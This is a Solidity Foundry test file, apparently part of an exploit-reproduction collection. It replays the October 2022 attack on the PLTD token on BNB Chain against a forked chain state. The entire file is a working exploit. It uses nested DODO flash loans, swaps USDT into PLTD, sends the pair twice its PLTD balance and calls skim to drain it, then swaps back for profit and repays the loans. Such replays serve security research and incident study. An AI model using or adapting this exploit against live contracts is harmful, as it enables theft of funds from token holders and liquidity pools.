//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1582181583343484928
// TX
// https://bscscan.com/tx/0x8385625e9d8011f4ad5d023d64dc7985f0315b6a4be37424c7212fe4c10dafe0

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 PLTD = IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4397C76088db8f16C15455eB943Dd11F2DF56545);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22_252_045);
    }

    function testExploit() external {
        USDT.approve(address(Router), type(uint256).max);
        PLTD.approve(address(Router), type(uint256).max);
        DVM(dodo1).flashLoan(0, 220_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            DVM(dodo2).flashLoan(0, 440_000 * 1e18, address(this), new bytes(1));
            USDT.transfer(dodo1, 220_000 * 1e18);
        }
        if (msg.sender == dodo2) {
            USDTToPLTD();
            uint256 amount = PLTD.balanceOf(address(Pair));
            PLTD.transfer(address(Pair), amount * 2 - 1);
            Pair.skim(address(this));
            PLTD.transfer(tx.origin, 1e18);
            PLTDToUSDT();
            USDT.transfer(dodo2, 440_000 * 1e18);
        }
    }

    function USDTToPLTD() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(PLTD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            660_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function PLTDToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(PLTD);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PLTD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
